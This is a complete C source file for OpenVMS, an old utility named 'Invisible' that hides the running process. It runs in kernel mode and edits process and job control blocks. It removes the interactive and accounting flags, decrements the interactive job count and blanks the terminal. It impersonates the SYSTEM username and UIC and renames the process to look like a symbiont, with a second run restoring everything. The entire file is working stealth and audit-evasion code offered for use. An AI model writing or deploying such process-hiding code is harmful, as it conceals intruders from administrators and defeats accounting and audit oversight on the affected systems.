#define module_name INVISIBLE
#define module_version "V1.0.1"
/*
 * Invisible	- Make a process invisible and visible again.  Originally
 *		  written in MACRO32.  Now in C so it runs on Alpha too.
 *
 *	Build:
 *	   VAX:
 *		$ cc invisible
 *		$ link invisible,sys$system:sys.stb/selective_search
 *
 *	   ALPHA:
 *		$ cc invisible
 *		$ link invisible/sysexe
 *
 *	Usage:
 *		$ run invisible
 *
 *
 *  Ehud Gavron
 *  ACES Consulting Inc.
 *  Gavron@ACES.COM
 *
 *	14-Oct-1992	Ehud Gavron	Ported to C, Alpha, ANSI, and 
 *					everything else.
 *	10-MAR-1998	Hunter Goatley	Minor change to work with more
 *					modern DEC C compilers.
 *
 */

#ifdef __alpha
#pragma module module_name module_version
#else /* __vax */
#module module_name module_version
#endif /* __alpha */

#ifndef __alpha
#define sys$gl_ijobcnt sys$gw_ijobcnt
#endif

#include <descrip.h>
#include "jibdef.h"	/* Extracted from LIB.MLB and massaged into C form */
#include "pcbdef.h"	/* Extracted from LIB.MLB and massaged into C form */
#include <ssdef.h>
#include <jpidef.h>
#include <psldef.h>
#include <lnmdef.h>
typedef union {
	struct {
		short s_buflen;
		short s_itemcode;
		char *s_bufaddr;
		int *s_retlen;
		} s;
	unsigned long end;
	} ITEMLIST;

#define	buflen		s.s_buflen
#define	itemcode	s.s_itemcode
#define	bufaddr		s.s_bufaddr
#define	retlen		s.s_retlen

struct ISB {
	int	l_uic;
	int	l_namelen;
#ifdef __alpha
	int	l_jobtype;
#else
	char	b_jobtype;
#endif
	char	b_terminal;
	char	t_lname[PCB$S_LNAME + 1];
	char	t_username[JIB$S_USERNAME + 1];
	};

struct ISB isb;
static int lnm_retlen;

ITEMLIST lnm_itmlst[2];
ITEMLIST jpi_itmlst[2];
struct dsc$descriptor_s prcnam_desc;
struct dsc$descriptor_s prcnam;
$DESCRIPTOR(lnm_tabnam,"LNM$PROCESS_TABLE");
$DESCRIPTOR(lnm_lognam,"ISB");
$DESCRIPTOR(fao_prcnam,"SYMBIONT_!UL");
int sysuic = 0x00010004;
char sysusername[] = "SYSTEM        ";
char namebuf[PCB$S_LNAME];

#ifdef __alpha
main()
#else
cmain()
#endif
{
	int sys$cmkrnl(),sys$exit(),invisible_k();
	int ss_stat;

	lnm_itmlst[0].buflen = sizeof(isb);
	lnm_itmlst[0].itemcode = LNM$_STRING;
	lnm_itmlst[0].bufaddr = (char *)&isb;
	lnm_itmlst[0].retlen = &lnm_retlen;
	lnm_itmlst[1].end = 0;
	
	jpi_itmlst[0].buflen = PCB$S_LNAME;
	jpi_itmlst[0].itemcode = JPI$_PRCNAM;
	jpi_itmlst[0].bufaddr = (char *)&isb.t_lname;
	jpi_itmlst[0].retlen = (int *)&isb.l_namelen;
	jpi_itmlst[1].end = 0;
	
	prcnam_desc.dsc$a_pointer = (char *)&isb.t_lname;
	prcnam_desc.dsc$w_length = PCB$S_LNAME;
	prcnam_desc.dsc$b_dtype = DSC$K_DTYPE_T;
	prcnam_desc.dsc$b_class = DSC$K_CLASS_S;
	
	prcnam.dsc$a_pointer = (char *)&namebuf;
	prcnam.dsc$w_length = PCB$S_LNAME;
	prcnam.dsc$b_dtype = DSC$K_DTYPE_T;
	prcnam.dsc$b_class = DSC$K_CLASS_S;
	
	ss_stat = sys$cmkrnl(invisible_k,0);
	(void) sys$exit(ss_stat);	
}

int invisible_k()
{
	int sys$getjpiw(),sys$crelnm(),sys$fao(),sys$setprn();
	int strncpy(), sys$exit(),sys$trnlnm(),sys$dellnm();
	int *a_long;
	int acmode = PSL$C_KERNEL;

#pragma nostandard			/* Oh well */
	globalref ctl$gl_pcb;
	globalref sys$gl_ijobcnt;
#pragma standard

	int ss_stat;
	char *pcb;
	char *jib;
	long *sts;
	long *own;
	char *p;
	long *q;
	int loop = 0;

	pcb = (char *)ctl$gl_pcb;

	if (pcb == 0) {
	   return(0);
	   }
	q = (long *)((char *)pcb + PCB$L_JIB);
	jib =(char *)  *q;

	sts = (long *)((char *)pcb + PCB$L_STS);

	if (*sts & PCB$M_INTER) {	/* Do stealth mode */
	   *sts = *sts^PCB$M_INTER;
	   *sts = *sts|PCB$M_NOACNT;
	   own = (long *)((char *)pcb + PCB$L_OWNER);
	   if (*own == 0) {  /* We are not a subprocess  */
	      sys$gl_ijobcnt--;
	      }

	   p = (char *)pcb + PCB$T_TERMINAL;
	   isb.b_terminal = *p;
	   *p = '\0'; 
	

#ifdef __alpha
	   q = (long *)((char *)jib + JIB$L_JOBTYPE);
	   isb.l_jobtype = *q;
	   *q = 0;
#else
	   p = (char *)jib + JIB$B_JOBTYPE;
	   isb.b_jobtype = *p;
	   *p = '\0';
#endif
	   strncpy((char *)&isb.t_username,
		   (char *)(jib + JIB$T_USERNAME),
		   JIB$S_USERNAME);

	   strncpy((char *)(jib + JIB$T_USERNAME),
		   (char *)&sysusername,
		   JIB$S_USERNAME);

	   q = (long *)((char *)pcb + PCB$L_UIC);
	   isb.l_uic = *q;
	   *q = sysuic;

	   ss_stat = sys$getjpiw(0,0,0,&jpi_itmlst,0,0,0);
	   if (!(ss_stat & 1)) return(ss_stat);
	   ss_stat = sys$crelnm(0,
				&lnm_tabnam,
				&lnm_lognam,
				&acmode,
				&lnm_itmlst);
	   if (!(ss_stat & 1)) return(ss_stat);
	   do {
	      loop++;
	      prcnam.dsc$w_length = PCB$S_LNAME;
	      ss_stat = sys$fao((char *)&fao_prcnam,
			        (char *)&prcnam.dsc$w_length,
				(char *)&prcnam,
				loop);
	      if (!(ss_stat &1)) return(ss_stat);
	      ss_stat = sys$setprn((char*)&prcnam);
	      } while (ss_stat == SS$_DUPLNAM);	     
	   return(SS$_NORMAL);
	   }
	else {	/* unstealth */
	   ss_stat = sys$trnlnm(0,
				&lnm_tabnam,
				&lnm_lognam,
				&acmode,
				&lnm_itmlst);
	   if (!(ss_stat & 1)) return(ss_stat);
	   
	   ss_stat = sys$dellnm(&lnm_tabnam,
				&lnm_lognam,
				&acmode);
	   if (!(ss_stat & 1)) return(ss_stat);

	   *sts = *sts|PCB$M_INTER;
           *sts = *sts^PCB$M_NOACNT;

	   own = (long *)((char *)pcb + PCB$L_OWNER);
	   if (*own == 0) {  /* We are not a subprocess  */
	      sys$gl_ijobcnt++;
	      }

	   q = (long *)((char *)pcb + PCB$L_UIC);
	   *q = isb.l_uic;

	   p = (char *)pcb + PCB$T_TERMINAL;
	   *p = isb.b_terminal;
	
#ifdef __alpha
	   q = (long *)((char *)jib + JIB$L_JOBTYPE);
	   *q = isb.l_jobtype;
#else
	   p = (char *)jib + JIB$B_JOBTYPE;
	   *p = isb.b_jobtype;
#endif
	   strncpy((char *)(jib + JIB$T_USERNAME),
		   (char *)&isb.t_username,
		   JIB$S_USERNAME);

	   prcnam_desc.dsc$w_length = (short)isb.l_namelen;
	   ss_stat = sys$setprn(&prcnam_desc);
	   return;
	}
}

#ifndef __alpha
int strncpy(a,b,c)
char *a,*b;
int c;
{
	for (; c > 0; c--) {
	  *a++ = *b++;
	  }
}
#endif
